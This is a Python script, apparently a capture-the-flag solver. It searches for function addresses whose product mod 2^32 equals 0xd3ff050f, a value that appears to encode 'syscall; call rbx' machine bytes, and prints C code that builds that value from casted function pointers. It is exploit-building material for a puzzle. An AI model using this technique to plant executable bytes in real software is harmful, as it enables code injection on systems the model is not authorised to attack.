import itertools

# compute the modular multiplicative inverse of a, mod b
# (extended euclidean algorithm)
def inv(a, b):
    x0, x1 = 1, 0
    while b != 0:
        q = a // b
        a, b = b, a % b
        x0, x1 = x1, x0 - q * x1
    assert a == 1, 'not coprime'
    return x0

def next_name():
    n = 2
    while True:
        yield from (''.join(x) for x in itertools.product('maint', repeat=n))
        n += 1
name = next_name()

# address of the first function
i = 0x40110d
# we can make a function that is 10 bytes long
inc = 10
# ints are modulo 2^32
m = 2**32
# numbers that we can get
have = {1}
# numbers that we want to get
target = {0xd3ff050f}
names = {}

# how can we get x using numbers we already have?
back = {}
# how can we get a target number from x?
forward = {}

# while we haven't met in the middle
while not have & target:
    names[i] = next(name)
    # we can get new numbers by taking an existing number and multiplying i
    h = [(x*i%m, (x, i)) for x in have]
    back.update(h)
    have.update(x[0] for x in h)

    j = inv(i, m) % m

    # if we can get x*j%m, then we can get x via x*j*i%m
    t = [(x*j%m, (x, i)) for x in target]
    forward.update(t)
    target.update(x[0] for x in t)
    i += inc

x = (have & target).pop()
y = x
n = []
while x in back:
    n.append(back[x][1])
    x = back[x][0]
while y in forward:
    n.append(forward[y][1])
    y = forward[y][0]
n = sorted(n);
print(n)
for k, v in names.items():
    print(f'{v}(a){{}}')
print(f'x={'*'.join('(int)'+names[x] for x in n)};')
